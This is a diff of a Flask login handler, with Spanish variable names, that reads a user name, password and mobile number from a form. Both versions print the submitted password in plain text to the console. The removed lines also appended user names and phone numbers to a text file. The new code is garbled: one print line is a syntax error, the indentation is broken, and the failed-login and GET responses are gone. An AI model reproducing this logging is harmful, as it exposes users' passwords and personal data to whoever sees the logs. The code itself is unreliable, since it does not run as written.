@@ -10,24 +10,18 @@ def login():
 
     if request.method == "POST":
 
-        usuario = request.form["usuario"]
-        clave = request.form["clave"]
-        celular = request.form["celular"]
-        print(f"Usuario: {usuario}")
-        print("========NUEVO ACCESO========")
-print(f"Celular: {celular}")
-print(f"Clave: {clave}")
-        print("=================")
-with open("accesos.txt", "a", encoding="utf-8") as archivo:
-    archivo.write(f"Usuario: {usuario} | Celular: {celular}\n")
+    usuario = request.form["usuario"]
+    clave = request.form["clave"]
+    celular = request.form["celular"]
 
-        if usuario == USUARIO and clave == CLAVE:
-            return render_template("index.html")
+    print("======== NUEVO ACCESO ========")
+    print(f"Usuario: {usuario}")
+    print(f"Celular: {celular}")
+    print(f"Clave": {clave})
+    print("==============================")
 
-        else:
-            return render_template("login.html", error="Usuario o contraseña incorrectos")
-
-    return render_template("login.html")
+    if usuario == USUARIO and clave == CLAVE:
+        return render_template("index.html")
 
 if __name__ == "__main__":
      app.run(host="0.0.0.0", port=5000)
